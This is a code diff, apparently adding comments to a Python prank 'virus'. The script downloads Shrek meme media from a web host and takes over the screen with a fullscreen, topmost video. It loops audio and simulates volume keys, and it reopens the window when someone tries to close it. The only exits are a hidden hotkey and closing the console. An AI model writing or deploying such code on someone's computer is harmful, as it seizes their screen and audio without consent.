@@ -10,14 +10,17 @@ from pynput.keyboard import Key,Controller
 import time
 import keyboard
 import os
-import sys
 from win32com.client import Dispatch
 import time
 from urllib.request import urlopen
 import pyautogui
 from pathlib import Path
 
+# Create Reference to desktop
+
 desktop = "%UserProfile%\\Desktop"
+
+# Create References to Downloads and Path
 
 path = "C:/Shrek_Files"
 url = "https://astrocore.net/gallery/meme.mp3"
@@ -25,6 +28,8 @@ url2 = "https://astrocore.net/gallery/meme-ts1640990550.mp4"
 
 file1 = Path('C:/Shrek_Files/meme.mp4')
 file2 = Path('C:/Shrek_Files/meme.mp3')
+
+# Create the Directory for virus files
 
 try:
     os.mkdir(path)
@@ -36,9 +41,12 @@ else:
 
 print("Preparing for launch.")
 
+# Path to files
 
 video = "C:/Shrek_Files/meme.mp4"
 sound = "C:/Shrek_Files/meme.mp3"
+
+# Download files if non-existing
 
 if file2.exists():
     print("File exists. Skipping Download")
@@ -54,7 +62,11 @@ else:
         with urlopen(url2) as remote:
             local.write(remote.read())
 
+# Find monitor width/height
+
 width, height= pyautogui.size()
+
+# Countdown
 
 time.sleep(1)
 print('Starting in 3')
@@ -63,9 +75,13 @@ print('Starting in 2')
 time.sleep(1)
 print('Starting in 1')
 
+# Play audio
+
 def play():
  while True:
       playsound(sound)
+
+# Change volume
 
 def volume():
     keyboard = Controller()
@@ -77,14 +93,20 @@ def volume():
             time.sleep(0.05)
      time.sleep(2)
 
+# Shutdown function
+
 def shutdown():
     root.destroy()
     quit()
+
+# Waiting For ctrl+alt+enter shortcut
 
 def emergency():
   while True:
        keyboard.wait('ctrl+alt+enter')
        shutdown()
+
+# Create video
 
 root = Tk()
 root.attributes("-fullscreen", True)
@@ -92,18 +114,26 @@ root.attributes('-topmost',True)
 my_label = Label(root)
 my_label.pack()
 
+# Start all threads
+
 threading.Thread(target=play).start()
 threading.Thread(target=volume).start()
 threading.Thread(target=emergency).start()
 
+# Start playing video
+
 player = tkvideo(video, my_label, loop = 1, size = (width, height))
 player.play()
+
+# Stop window from being closable
 
 def on_closing():
    player = tkvideo(video, my_label, loop = 1, size = (width, height))
    player.play()
 
 root.protocol("WM_DELETE_WINDOW", on_closing)
+
+# Showing How to stop virus
 
 print("Close this console to shutdown Virus!")
 
